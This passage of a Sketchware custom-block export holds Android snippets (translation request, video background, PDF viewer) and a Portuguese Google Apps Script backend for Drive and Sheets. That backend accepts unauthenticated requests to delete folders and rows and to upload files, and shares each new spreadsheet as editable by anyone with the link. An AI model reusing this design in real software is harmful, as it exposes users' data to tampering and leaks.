org.json.JSONArray(_res).getJSONArray(0).getJSONArray(0).getString(0)","typeName":"","palette":"211","paletteColor":0.0,"type":"s","spec":"Response","spec2":""},{"code":"((EditText)%s).setError(%s);","color":"#FF9E9E9E","name":"EditTextShowError","typeName":"","palette":"211","paletteColor":0.0,"type":"s","spec":"%m.edittext show error %s","spec2":""},{"code":"HashMap\u003cString, Object\u003e param \u003d new HashMap\u003c\u003e();\r\nparam.put(\"User-Agent\", \"Mozilla/5.0\");\nString url \u003d \"\";\r\nString text \u003d %2$s;\r\nString from \u003d %3$s;\r\nString to \u003d %4$s;\r\ntry {\r\n\turl \u003d \"https://translate.googleapis.com/translate_a/single?client\u003dgtx\u0026sl\u003d\"+from+\"\u0026tl\u003d\"+to+\"\u0026dt\u003dt\u0026q\u003d\"+java.net.URLEncoder.encode(text, \"utf-8\");\r\n} catch (Exception e) {\r\n\tshowMessage(e.getMessage());\n\treturn;\r\n}\r\n%1$s.setParams(param, RequestNetworkController.REQUEST_PARAM);\r\n%1$s.startRequestNetwork(RequestNetworkController.GET, url, %5$s, _%1$s_request_listener);","color":"#FF9E9E9E","name":"TranslatorAPI","typeName":"","palette":"211","paletteColor":0.0,"type":" ","spec":"%m.RequestNetwork Translate %s from %s to %s tag %s ","spec2":""},{"code":"function doPost(e) {\n var lock \u003d LockService.getScriptLock();\n lock.waitLock(30000); // Aguardar até 30 segundos para obter o bloqueio\n\n try {\n  var action \u003d e.parameter.action;\n  var folderName \u003d e.parameter.foldername;\n  var fileName \u003d e.parameter.filename;\n  var fileContent \u003d e.parameter.filecontent;\n  var pageName \u003d e.parameter.pagename;\n  var id \u003d e.parameter.id;\n  var mimeType \u003d e.parameter.mimetype;\n\n  if (action \u003d\u003d \"createfolder\") {\n   return createFolder(folderName);\n  } else if (action \u003d\u003d \"deletefolder\") {\n   return deleteFolder(folderName);\n  } else if (action \u003d\u003d \"uploadfile\") {\n   return uploadFile(folderName, fileName, fileContent, mimeType);\n  } else if (action \u003d\u003d\u003d \"createsheet\" \u0026\u0026 fileName \u0026\u0026 fileContent) {\n   return createsheet(fileName, JSON.parse(fileContent));\n  } else if (action \u003d\u003d\u003d \"createfolder\" \u0026\u0026 folderName) {\n   return createFolder(folderName);\n  } else if (action \u003d\u003d\u003d \"uploadfile\" \u0026\u0026 folderName \u0026\u0026 fileName \u0026\u0026 data \u0026\u0026 mimeType) {\n   return uploadFile(folderName, fileName, data, mimeType);\n  } else if (action \u003d\u003d\u003d \"deleterow\" \u0026\u0026 fileName \u0026\u0026 pageName \u0026\u0026 id) {\n   return deleteRow(fileName, pageName, id);\n  } else if (action \u003d\u003d\u003d \"postrow\" \u0026\u0026 fileName \u0026\u0026 pageName \u0026\u0026 fileContent) {\n   return postRow(fileName, pageName, JSON.parse(fileContent));\n  } else if (action \u003d\u003d\u003d \"updatecell\" \u0026\u0026 fileName \u0026\u0026 pageName \u0026\u0026 fileContent) {\n   var data \u003d JSON.parse(fileContent);\n   var id \u003d data.ID;\n   var key \u003d data.Key;\n   var value \u003d data.Value;\n   var success \u003d updateCell(fileName, pageName, id, key, value);\n   if (success) {\n    return ContentService.createTextOutput(\"Célula atualizada com sucesso.\");\n   } else {\n    return ContentService.createTextOutput(\"ID ou chave de coluna não encontrados.\");\n   }\n  } else if (action \u003d\u003d\u003d \"querysheet\" \u0026\u0026 fileName \u0026\u0026 pageName \u0026\u0026 fileContent) {\n   var dataquery \u003d JSON.parse(fileContent);\n   return querySheet(fileName, pageName, dataquery);\n  } else {\n   return ContentService.createTextOutput(\"Ação inválida ou parâmetros inválidos.\");\n  }\n } catch (error) {\n  return ContentService.createTextOutput(\"Erro durante o processamento da solicitação.\");\n } finally {\n  lock.releaseLock(); // Liberar o bloqueio\n }\n}\n\n//função uploadfile essa função faz upload de qualquer arquivos\n\nfunction uploadFile(folderName, fileName, fileContent, mimeType) {\n var data \u003d Utilities.base64Decode(fileContent);\n var timestamp \u003d new Date().getTime(); // obtém o timestamp atual\n var newFileName \u003d timestamp + \"_\" + fileName; // adiciona o timestamp ao nome do arquivo\n var blob \u003d Utilities.newBlob(data, mimeType, newFileName);\n var folder \u003d DriveApp.getFoldersByName(folderName).next();\n var file \u003d folder.createFile(blob);\n var fileId \u003d file.getId();\n return ContentService.createTextOutput(\"sucesso:\" + fileId);\n}\n\n// Função para criação de pastas dentro da pasta por nome PastaPai\n// mude o nome da pasta pai caso queira .\n\nfunction createFolder(folderName) {\n var parentFolderName \u003d \u0027PastaPai\u0027; // substitua pelo nome da pasta pai\n var parentFolder \u003d DriveApp.getFoldersByName(parentFolderName).next();\n var newFolder \u003d parentFolder.createFolder(folderName);\n return ContentService.createTextOutput(\u0027Pasta criada com sucesso! ID da pasta: \u0027 + newFolder.getId());\n}\n\n// Função para deletar qualquer pasta dentro da pasta pai.\n\nfunction deleteFolder(folderName) {\n var parentFolderName \u003d \u0027PastaPai\u0027; // substitua pelo nome da pasta pai\n var parentFolder \u003d DriveApp.getFoldersByName(parentFolderName).next();\n var folders \u003d parentFolder.getFoldersByName(folderName);\n if (folders.hasNext()) {\n  var folder \u003d folders.next();\n  DriveApp.getFolderById(folder.getId()).setTrashed(true); // exclui a pasta encontrada\n  return ContentService.createTextOutput(\u0027Pasta \u0027 + folderName + \u0027 excluída com sucesso!\u0027);\n } else {\n  return ContentService.createTextOutput(\u0027Pasta \u0027 + folderName + \u0027 não encontrada.\u0027);\n }\n}\n\n// Função para criação de planilhas já com chaves do\n// cabeçalho prontas para receber novos valores abaixo.\n\nfunction createsheet(sheetName, fileContent) {\n var spreadsheet \u003d SpreadsheetApp.create(sheetName);\n var sheet \u003d spreadsheet.getActiveSheet();\n\n // Define os cabeçalhos\n var headers \u003d Object.keys(fileContent);\n var headerRange \u003d sheet.getRange(1, 1, 1, headers.length);\n headerRange.setValues([headers]);\n\n // Preenche os valores\n var values \u003d Object.values(fileContent);\n var valueRange \u003d sheet.getRange(2, 1, 1, values.length);\n valueRange.setValues([values.map(value \u003d\u003e value \u003d\u003d\u003d null ? \u0027\u0027: value)]);\n\n // Obtém o ID do arquivo\n var fileId \u003d spreadsheet.getId();\n\n // Define as permissões de compartilhamento para editar\n DriveApp.getFileById(fileId).setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.EDIT);\n\n return ContentService.createTextOutput(\"Planilha criada com sucesso: \" + spreadsheet.getName());\n}\n\n// postRow é a função para postar novas linhas com dados\n// que será escrito em cada key correspondente .\n\nfunction postRow(fileName, pageName, fileContent) {\n var spreadsheet \u003d getSpreadsheetByName(fileName);\n\n if (spreadsheet) {\n  var sheet \u003d spreadsheet.getSheetByName(pageName);\n\n  if (sheet) {\n   var id \u003d fileContent.ID;\n   var newData \u003d Object.values(fileContent);\n\n   var dataRange \u003d sheet.getDataRange();\n   var values \u003d dataRange.getValues();\n   var headers \u003d values[0];\n   var idColumnIndex \u003d headers.indexOf(\"ID\");\n\n   if (idColumnIndex !\u003d\u003d -1) {\n    for (var rowIndex \u003d 1; rowIndex \u003c values.length; rowIndex++) {\n     var rowData \u003d values[rowIndex];\n     var existingId \u003d rowData[idColumnIndex];\n\n     if (existingId \u003d\u003d id) {\n      sheet.getRange(rowIndex + 1, 1, 1, newData.length).setValues([newData]);\n      return ContentService.createTextOutput(\"Linha com ID \" + id + \" atualizada com sucesso na página \u0027\" + pageName + \"\u0027 da planilha: \" + spreadsheet.getName());\n     }\n    }\n\n    sheet.appendRow(newData);\n    return ContentService.createTextOutput(\"Nova linha adicionada com sucesso à página \u0027\" + pageName + \"\u0027 da planilha: \" + spreadsheet.getName());\n   } else {\n    return ContentService.createTextOutput(\"A coluna \u0027ID\u0027 não existe na planilha.\");\n   }\n  } else {\n   return ContentService.createTextOutput(\"Página \u0027\" + pageName + \"\u0027 não encontrada na planilha.\");\n  }\n } else {\n  return ContentService.createTextOutput(\"Planilha não encontrada.\");\n }\n}\n\n// essa função é para buscarmos a spreadsheet por Nome ao invés de Id\n// todo este Script depende dessa função\n\nfunction getSpreadsheetByName(name) {\n var files \u003d DriveApp.getFilesByName(name);\n\n if (files.hasNext()) {\n  var file \u003d files.next();\n  var spreadsheet \u003d SpreadsheetApp.open(file);\n  return spreadsheet;\n } else {\n  return null;\n }\n}\n\n// updateCell é a função que permite a edição de valores por\n// key na posição da ID lembrando que na Planilha\n// cada célula é uma key com valor referente a key do cabeçalho\n\nfunction updateCell(fileName, pageName, id, key, newValue) {\n var spreadsheet \u003d getSpreadsheetByName(fileName);\n\n if (spreadsheet) {\n  var sheet \u003d spreadsheet.getSheetByName(pageName);\n\n  if (sheet) {\n   var dataRange \u003d sheet.getDataRange();\n   var values \u003d dataRange.getValues();\n   var headers \u003d values[0];\n   var idColumnIndex \u003d headers.indexOf(\"ID\");\n   var keyColumnIndex \u003d headers.indexOf(key);\n\n   if (idColumnIndex !\u003d\u003d -1 \u0026\u0026 keyColumnIndex !\u003d\u003d -1) {\n    for (var rowIndex \u003d 1; rowIndex \u003c values.length; rowIndex++) {\n     var rowData \u003d values[rowIndex];\n     var existingId \u003d rowData[idColumnIndex];\n\n     if (existingId \u003d\u003d id) {\n      sheet.getRange(rowIndex + 1, keyColumnIndex + 1).setValue(newValue);\n      return true;\n     }\n    }\n   }\n  }\n }\n\n return false;\n}\n\n// deleteRow é para deletar toda a linha da ID fornecida\n\nfunction deleteRow(fileName, pageName, id) {\n var spreadsheet \u003d getSpreadsheetByName(fileName);\n\n if (spreadsheet) {\n  var sheet \u003d spreadsheet.getSheetByName(pageName);\n\n  if (sheet) {\n   var dataRange \u003d sheet.getDataRange();\n   var values \u003d dataRange.getValues();\n   var headers \u003d values[0];\n   var idColumnIndex \u003d headers.indexOf(\"ID\");\n\n   if (idColumnIndex !\u003d\u003d -1) {\n    for (var rowIndex \u003d 1; rowIndex \u003c values.length; rowIndex++) {\n     var rowData \u003d values[rowIndex];\n     var existingId \u003d rowData[idColumnIndex];\n\n     if (existingId \u003d\u003d id) {\n      sheet.deleteRow(rowIndex + 1);\n      return ContentService.createTextOutput(\"Linha com ID \" + id + \" deletada com sucesso da página \u0027\" + pageName + \"\u0027 da planilha: \" + spreadsheet.getName());\n     }\n    }\n\n    return ContentService.createTextOutput(\"ID não encontrado na planilha.\");\n   } else {\n    return ContentService.createTextOutput(\"A coluna \u0027ID\u0027 não existe na planilha.\");\n   }\n  } else {\n   return ContentService.createTextOutput(\"Página \u0027\" + pageName + \"\u0027 não encontrada na planilha.\");\n  }\n } else {\n  return ContentService.createTextOutput(\"Planilha não encontrada.\");\n }\n}\n\n// query Sheer é uma função três em um , se você desejar ler toda a Página\n// Envie o valor da key query como all que significa tudo.\n// Envie querycontains para filtrar valores aproximados.\n// e por fim Envie queryexact para filtrar valores exatos.\n// baixe o projeto CRUD para Sketchware para melhor compreender.\n\nfunction querySheet(fileName, pageName, dataquery) {\n var spreadsheet \u003d getSpreadsheetByName(fileName);\n\n if (spreadsheet) {\n  var sheet \u003d spreadsheet.getSheetByName(pageName);\n\n  if (sheet) {\n   var query \u003d dataquery.Query;\n   var value \u003d dataquery.Value;\n   var dataRange \u003d sheet.getDataRange();\n   var values \u003d dataRange.getValues();\n   var headers \u003d values[0];\n   var jsonData \u003d [];\n\n   if (query \u003d\u003d\u003d \"all\") {\n    // Retornar todas as linhas como um array JSON\n    for (var i \u003d 1; i \u003c values.length; i++) {\n     var row \u003d {};\n     for (var j \u003d 0; j \u003c headers.length; j++) {\n      row[headers[j]] \u003d values[i][j];\n     }\n     jsonData.push(row);\n    }\n   } else if (query \u003d\u003d\u003d \"contains\") {\n    // Filtrar linhas que contêm o valor fornecido\n    for (var i \u003d 1; i \u003c values.length; i++) {\n     var row \u003d {};\n     for (var j \u003d 0; j \u003c headers.length; j++) {\n      row[headers[j]] \u003d values[i][j];\n     }\n     for (var key in row) {\n      if (row.hasOwnProperty(key) \u0026\u0026 row[key].toString().includes(value)) {\n       jsonData.push(row);\n       break;\n      }\n     }\n    }\n   } else if (query \u003d\u003d\u003d \"equals\") {\n    // Filtrar linhas que têm o valor igual ao fornecido\n    for (var i \u003d 1; i \u003c values.length; i++) {\n     var row \u003d {};\n     for (var j \u003d 0; j \u003c headers.length; j++) {\n      row[headers[j]] \u003d values[i][j];\n     }\n     for (var key in row) {\n      if (row.hasOwnProperty(key) \u0026\u0026 row[key] \u003d\u003d\u003d value) {\n       jsonData.push(row);\n       break;\n      }\n     }\n    }\n   } else {\n    return ContentService.createTextOutput(\"Valor inválido para a chave \u0027query\u0027.\");\n   }\n\n   return ContentService.createTextOutput(JSON.stringify(jsonData));\n  } else {\n   return ContentService.createTextOutput(\"Página \u0027\" + pageName + \"\u0027 não encontrada na planilha.\");\n  }\n } else {\n  return ContentService.createTextOutput(\"Planilha não encontrada.\");\n }\n}\n\n// SketchDevBrSheetDBvTop10\n// copyright SketchDevBrasil\n// canal https://youtube.com/@SketchDevBrasil\n// grupo telegran https://t.me/gruposketchdevbrasil\n// se puder pague um café papa o Dev  kodeshaplicativos@gmail.com.\n// by Dev Marcos Teixeira","color":"#FF4CAF50","name":"Database com Planilhas e pastas do google drive com manipulação via script [{ \"Copyright\" : \"Sketch Dev Brasil o original 😎 \",}] todos direitos reservados","typeName":"","palette":"212","type":"s","spec":"CODIGO API Sketch Dev DBShwetVtop10 . Database com manipulação de Planilhas e upload de midias em pastas via script app web no appScript da google"},{"code":"","color":"#FF4CAF50","name":"Sketch Dev Database Put Value /SkdDBSheet-vTop10","typeName":"","palette":"212","type":"s","spec":"Bloco de enviar Paramertros json object com keys ordenadas originalmente"},{"code":"%1$s.put(%2$s,%3$s);\n","color":"#FF607D8B","name":"map put key \u003d value [{ \"Copyright\" : \"Sketch Dev Brasil\",}]","typeName":"map","palette":"212","type":" ","spec":" map%m.varMap .put key %s \u003d value%s "},{"code":"LinkedHashMap\u003cString, String\u003e %1$s \u003d new LinkedHashMap\u003cString, String\u003e();\n%2$s","color":"#FF607D8B","name":"LinkedHashMap to Json preserva a ordem das keys no json  [{ \"Copyright\" : \"Sketch Dev Brasil\",}]","typeName":"","palette":"212","type":"c","spec":" New HashMap  %m.varMap  "},{"code":"","color":"#FF4CAF50","name":"Sketch Dev Database Blocos de upload de arquivos adicione ao MoreBlock Extra /SkdDB-v1.0_copy49","typeName":"","palette":"212","type":"s","spec":"Blocos de upload de arquivos , add em more block extra    "},{"code":"}\npublic String readFileBase64(String path){\r\nString filePath \u003d path;\r\nString outData \u003d \"\";\r\n   \r\n    java.io.File file \u003d new java.io.File(filePath);\r\n    try (java.io.FileInputStream InFile \u003d new java.io.FileInputStream(file)) {\r\n    // Reading a file from file system\r\n    byte fileData[] \u003d new byte[(int) file.length()];\r\n    InFile.read(fileData);\r\n    byte[] encodedBytesFile \u003d org.apache.commons.codec.binary.Base64.encodeBase64(fileData);\r\n    \r\n    outData \u003d new String(encodedBytesFile);\r\n    } catch (java.io.FileNotFoundException e) {\r\n SketchwareUtil.showMessage(getApplicationContext(), \"File not found\" + e);\r\n    } catch (java.io.IOException ioe) {\r\nSketchwareUtil.showMessage(getApplicationContext(),\"Exception while reading the File \" + ioe);\r\n    }\r\n    return outData;\r\n}\npublic void haha_lol () {","color":"#FF607D8B","name":"put me at more block Extra ","typeName":"","palette":"212","type":" ","spec":"put me at more block Extra  "},{"code":"readFileBase64(%1$s)","color":"#FF607D8B","name":"Codificando caminho do file para google Drive","typeName":"","palette":"212","type":"s","spec":"read a file with path %s"},{"code":"// %1$s //","color":"#FF607D8B","name":"isso serve para Anotações","typeName":"","palette":"212","type":" ","spec":"Anotações // %s // "},{"code":"Para usar estes API  basta criar  um app no serviços da google AppScript\nhttps://www.google.com/script/start/\n\nsegue o vídeo exemplo \nhttps://youtu.be/emF-zxU5SK8\n\n baixe  no Sketch Dev Brasil o projeto SWB de exemplo para você saber como enviar as solicitações  em parâmetros JsonObject para backend do appScript para as operações \n\n1 createsheet\n2 createrow\n3 updaterow\n4 updatecell\n5 deleterow\n6 queryall\n7 querycontains\n8 queryequals\n9 createfolder\n10 deletefolder\n11 upload mídia in folder\n\nboa sorte e que Deus te abençoe \n\nAaa , não se esqueça de pagar um café para o desenvolvedor deste API que foram dias de dedicação, mas se não puder , relaxa e seja feliz 😉.\n\npix kodeshaplicativos@gmail.com\n","color":"#FF4CAF50","name":"Instruções de uso ","typeName":"","palette":"212","type":"s","spec":"README / LEIA ME"},{"code":"","color":"#FF4CAF50","name":"Use estes codificadores para caracteres especiais","typeName":"","palette":"212","type":"s","spec":"Use estes codificadores para caracteres especiais"},{"code":"%1$s\n.replace(\"\u0026\", \"AND\")\n.replace(\"\u003d\", \"EQUAL\")\n.replace(\"%%\", \"PERCENTAGE\")\n.replace(\"#\", \"HASTAG\")\n.replace(\"+\", \"PLUS\")\n.replace(\"\\n\", \"ESCAPE\")","color":"#FF607D8B","name":"Codificar Caracteres especiais","typeName":"","palette":"212","type":"s","spec":"Codificar Caracteres especiais %s "},{"code":"%1$s\n.replace(\"AND\", \"\u0026\")\n.replace(\"EQUAL\", \"\u003d\")\n.replace(\"PERCENTAGE\", \"%%\")\n.replace(\"HASTAG\", \"#\")\n.replace(\"PLUS\", \"+\")\n.replace(\"ESCAPE\",\"\\n\")","color":"#FF607D8B","name":"Decodificar Caracteres especiais","typeName":"","palette":"212","type":"s","spec":"Decodificar Caracteres especiaus %s "},{"code":"final VideoView vd \u003d new VideoView(%3$s.this);\r\nvd.setLayoutParams(new LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.MATCH_PARENT));\r\n\r\nvd.setVideoURI(Uri.parse(%4$s));\r\r\nvd.requestFocus();\r\nvd.setOnPreparedListener(new MediaPlayer.OnPreparedListener(){\n\t\t\t@Override\n\t\t\tpublic void onPrepared(MediaPlayer _mediaPlayer){\n\t\t\t\tvd.start();\n\t\t\t}\n\t\t});\r\n\nvd.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {\npublic void onCompletion(MediaPlayer mp) {\nvd.start();\n} });\n\n//this layout will conatin your video view\nRelativeLayout rl \u003d new RelativeLayout(this);\n\n\n//this layout will contain your widgets which are to be shown on video\nRelativeLayout rl2 \u003d new RelativeLayout(this);\n\nrl2.addView(vd, -1,-1);\n\n%1$s.removeAllViews();\n\nrl.addView(rl2, -1,-1);\nrl.addView(%2$s, -1,-1);\n\n\n%1$s.addView(rl,-1,-1);\n\n\n\n//this property will all the video to be played in full screen\nDisplayMetrics metrics \u003d new DisplayMetrics(); getWindowManager().getDefaultDisplay().getMetrics(metrics); android.widget.RelativeLayout.LayoutParams params \u003d (android.widget.RelativeLayout.LayoutParams) vd.getLayoutParams(); \nparams.addRule(android.widget.RelativeLayout.ALIGN_PARENT_TOP, android.widget.RelativeLayout.TRUE);\nparams.addRule(android.widget.RelativeLayout.ALIGN_PARENT_START, android.widget.RelativeLayout.TRUE);\nparams.addRule(android.widget.RelativeLayout.ALIGN_PARENT_END, android.widget.RelativeLayout.TRUE);\nparams.addRule(android.widget.RelativeLayout.ALIGN_PARENT_BOTTOM, android.widget.RelativeLayout.TRUE);\nvd.requestLayout();\n\n","color":"#FF26C6DA","name":"Background Video","typeName":"","palette":"213","type":" ","spec":"View %m.view addView %m.view VideoView %m.activity VideoUrl %s "},{"code":"","color":"#FF880E4F","name":"ArabWare    ","typeName":"","palette":"214","type":"h","spec":"This By Arab Ware Channel Dont Dont Dont Edit it هذا بواسطة قناة عرب وير بواسطة امير عزت اياك و تعديله"},{"code":"}\nprivate\nandroid.graphics.pdf.PdfRenderer\nrenderer;\nZoomableImageView touch;\r\npublic class ZoomableImageView extends ImageView {\n\n\nMatrix matrix \u003d new Matrix();\n\nstatic final int NONE \u003d 0;\n\nstatic final int DRAG \u003d 1;\n\nstatic final int ZOOM \u003d 2;\n\nstatic final int CLICK \u003d 3;\n\nint mode \u003d NONE;\n\nPointF last \u003d new PointF();\n\nPointF start \u003d new PointF();\n\nfloat minScale \u003d 1f;\n\nfloat maxScale \u003d 4f;\n\nfloat[] m;\n\nfloat redundantXSpace, redundantYSpace;\n\nfloat width, height;\n\nfloat saveScale \u003d 1f;\n\nfloat right, bottom, origWidth, origHeight, bmWidth, bmHeight;\n\nScaleGestureDetector mScaleDetector;\n\nContext context;\n\n\npublic ZoomableImageView(Context context) {\n\nsuper(context);\n\nsuper.setClickable(true);\n\nthis.context \u003d context;\n\nmScaleDetector \u003d new ScaleGestureDetector(context, new ScaleListener());\n\nmatrix.setTranslate(1f, 1f);\n\nm \u003d new float[9];\n\nsetImageMatrix(matrix); setScaleType(ScaleType.MATRIX);\n\n\nsetOnTouchListener(new OnTouchListener() {\n\n@Override\n\npublic boolean onTouch(View v, MotionEvent event) {\n\nmScaleDetector.onTouchEvent(event);\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nPointF curr \u003d new PointF(event.getX(), event.getY());\n\nswitch (event.getAction()) {\n\ncase MotionEvent.ACTION_DOWN: last.set(event.getX(), event.getY()); start.set(last); mode \u003d DRAG;\n\nbreak;\n\ncase MotionEvent.ACTION_POINTER_DOWN: last.set(event.getX(), event.getY()); start.set(last);\n\nmode \u003d ZOOM;\n\nbreak;\n\ncase MotionEvent.ACTION_MOVE:\n\nif (mode \u003d\u003d ZOOM || (mode \u003d\u003d DRAG \u0026\u0026 saveScale \u003e minScale)) {\n\nfloat deltaX \u003d curr.x - last.x;\n\nfloat deltaY \u003d curr.y - last.y;\n\nfloat scaleWidth \u003d Math.round(origWidth * saveScale);\n\nfloat scaleHeight \u003d Math.round(origHeight * saveScale);\n\nif (scaleWidth \u003c width) {\n\ndeltaX \u003d 0;\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n} else if (scaleHeight \u003c height) {\n\ndeltaY \u003d 0;\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\n} else {\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n}\n\nmatrix.postTranslate(deltaX, deltaY);\n\nlast.set(curr.x, curr.y);\n\n}\n\nbreak;\n\ncase MotionEvent.ACTION_UP:\n\nmode \u003d NONE;\n\nint xDiff \u003d (int) Math.abs(curr.x - start.x);\n\nint yDiff \u003d (int) Math.abs(curr.y - start.y);\n\nif (xDiff \u003c CLICK \u0026\u0026 yDiff \u003c CLICK) performClick();\n\nbreak;\n\ncase MotionEvent.ACTION_POINTER_UP:\n\nmode \u003d NONE;\n\nbreak;\n\n}\n\nsetImageMatrix(matrix);\n\ninvalidate();\n\nreturn true;\n\n}\n\n});\n\n}\n\n\n@Override\n\npublic void setImageBitmap(Bitmap bm) {\n\nsuper.setImageBitmap(bm);\n\nbmWidth \u003d bm.getWidth();\n\nbmHeight \u003d bm.getHeight(); }\n\n\npublic void setMaxZoom(float x) {\n\nmaxScale \u003d x; }\n\n\nprivate class ScaleListener extends ScaleGestureDetector.SimpleOnScaleGestureListener {\n\n@Override\n\npublic boolean onScaleBegin(ScaleGestureDetector detector) {\n\nmode \u003d ZOOM;\n\nreturn true;}\n\n@Override\n\npublic boolean onScale(ScaleGestureDetector detector) {\n\nfloat mScaleFactor \u003d detector.getScaleFactor();\n\nfloat origScale \u003d saveScale;\n\nsaveScale *\u003d mScaleFactor;\n\nif (saveScale \u003e maxScale){\n\nsaveScale \u003d maxScale;\n\nmScaleFactor \u003d maxScale / origScale;\n\n} else if (saveScale \u003c minScale) {\n\nsaveScale \u003d minScale;\n\nmScaleFactor \u003d minScale / origScale;}\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale);\n\nif (origWidth * saveScale \u003c\u003d width || origHeight * saveScale \u003c\u003d height) {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, width / 2, height / 2);\n\nif (mScaleFactor \u003c 1) {\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (Math.round(origWidth * saveScale) \u003c width) {\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);\n\n} else {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);}\n\n}\n\n}\n\n} else {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, detector.getFocusX(), detector.getFocusY()); matrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);}\n\n}\n\nreturn true;\n\n}\n\n}\n\n\n@Override\n\nprotected void onMeasure (int widthMeasureSpec, int heightMeasureSpec) {\n\nsuper.onMeasure(widthMeasureSpec, heightMeasureSpec);\n\nwidth \u003d MeasureSpec.getSize(widthMeasureSpec);\n\nheight \u003d MeasureSpec.getSize(heightMeasureSpec);\n\nfloat scale;\n\nfloat scaleX \u003d width / bmWidth;\n\nfloat scaleY \u003d height / bmHeight;\n\nscale \u003d Math.min(scaleX, scaleY); matrix.setScale(scale, scale); setImageMatrix(matrix);\n\nsaveScale \u003d 1f;\n\nredundantYSpace \u003d height - (scale * bmHeight) ;\n\nredundantXSpace \u003d width - (scale * bmWidth);\n\nredundantYSpace /\u003d 2;\n\nredundantXSpace /\u003d 2; matrix.postTranslate(redundantXSpace, redundantYSpace);\n\norigWidth \u003d width - 2 * redundantXSpace;\n\norigHeight \u003d height - 2 * redundantYSpace;\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale); setImageMatrix(matrix);}\n\n}\n\n    \r\n{","color":"#FF880E4F","name":"pdf library","typeName":"","palette":"214","type":" ","spec":"pdf library | in more block |"},{"code":"","color":"#FF880E4F","name":"Something Needs Storage permission or another  arab ware","typeName":"","palette":"214","type":"h","spec":"Something Needs Storage permission or another"},{"code":"android.graphics.pdf.PdfRenderer.Page page \u003d renderer.openPage((int)%1$s);\n\nBitmap mBitmap \u003d Bitmap.createBitmap((int)getDip(page.getWidth()), (int)getDip(page.getHeight()), Bitmap.Config.ARGB_8888);\n\npage.render(mBitmap, null, null, android.graphics.pdf.PdfRenderer.Page.RENDER_MODE_FOR_DISPLAY);\n\ntouch.setImageBitmap(mBitmap);\n\npage.close();","color":"#FF880E4F","name":"Display PDF With Page","typeName":"","palette":"214","type":" ","spec":"display pdf file with page %d"},{"code":"try {\nrenderer \u003d new android.graphics.pdf.PdfRenderer(new ParcelFileDescriptor(ParcelFileDescriptor.open(new java.io.File(%s), ParcelFileDescriptor.MODE_READ_ONLY)));\n%s\n} catch (Exception e){\n%s\n}","color":"#FF880E4F","typeName":"","name":"Try Display Pdf","palette":"214","type":"e","spec":"Try Display Pdf from path %s","spec2":"if there is error then"},{"code":"touch \u003d new\nZoomableImageView(%2$s.this);\n%1$s.addView(touch);","color":"#FF880E4F","name":"Display Pdf Into","typeName":"","palette":"214","type":" ","spec":"Display Pdf Into %m.view %m.activity"},{"code":"renderer.getPageCount()","color":"#FF880E4F","name":"Get Total Pages","typeName":"","palette":"214","type":"d","spec":"get total pdf file pages"},{"code":"","color":"#FF00838F","name":"created by Arab.","typeName":"","palette":"215","type":"h","spec":"Created By Arab Ware Channel"},{"code":"}\nprivate\nandroid.graphics.pdf.PdfRenderer\nrenderer;\nZoomableImageView touch;\r\npublic class ZoomableImageView extends ImageView {\n\n\nMatrix matrix \u003d new Matrix();\n\nstatic final int NONE \u003d 0;\n\nstatic final int DRAG \u003d 1;\n\nstatic final int ZOOM \u003d 2;\n\nstatic final int CLICK \u003d 3;\n\nint mode \u003d NONE;\n\nPointF last \u003d new PointF();\n\nPointF start \u003d new PointF();\n\nfloat minScale \u003d 1f;\n\nfloat maxScale \u003d 4f;\n\nfloat[] m;\n\nfloat redundantXSpace, redundantYSpace;\n\nfloat width, height;\n\nfloat saveScale \u003d 1f;\n\nfloat right, bottom, origWidth, origHeight, bmWidth, bmHeight;\n\nScaleGestureDetector mScaleDetector;\n\nContext context;\n\n\npublic ZoomableImageView(Context context) {\n\nsuper(context);\n\nsuper.setClickable(true);\n\nthis.context \u003d context;\n\nmScaleDetector \u003d new ScaleGestureDetector(context, new ScaleListener());\n\nmatrix.setTranslate(1f, 1f);\n\nm \u003d new float[9];\n\nsetImageMatrix(matrix); setScaleType(ScaleType.MATRIX);\n\n\nsetOnTouchListener(new OnTouchListener() {\n\n@Override\n\npublic boolean onTouch(View v, MotionEvent event) {\n\nmScaleDetector.onTouchEvent(event);\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nPointF curr \u003d new PointF(event.getX(), event.getY());\n\nswitch (event.getAction()) {\n\ncase MotionEvent.ACTION_DOWN: last.set(event.getX(), event.getY()); start.set(last); mode \u003d DRAG;\n\nbreak;\n\ncase 